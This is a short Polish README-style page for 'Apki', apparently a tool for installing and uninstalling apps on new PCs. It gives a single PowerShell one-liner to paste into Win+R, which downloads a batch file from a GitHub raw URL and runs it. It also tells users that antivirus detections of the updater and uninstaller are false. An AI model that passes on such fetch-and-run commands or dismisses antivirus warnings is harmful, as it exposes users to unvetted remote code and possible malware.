Apki - Instalowanie i Odinstalowanie, dobre na nowiutkie komputery

WAŻNE! Antywirusy np. AVG i Avast mogą wykryć w updaterze IDP.HELU.PSD11 a w funkcji odinstalowania programow IDP.Generic, te wykrycia są błędne!

by zainstalować, trzeba wpisac poniższą komende w poleceniu uruchom "Win + R":

powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/szubixyt-dev/Apki/installer/Instalator%20Apki.bat' -OutFile $env:TEMP\i.bat; cmd /c %TEMP%\i.bat"
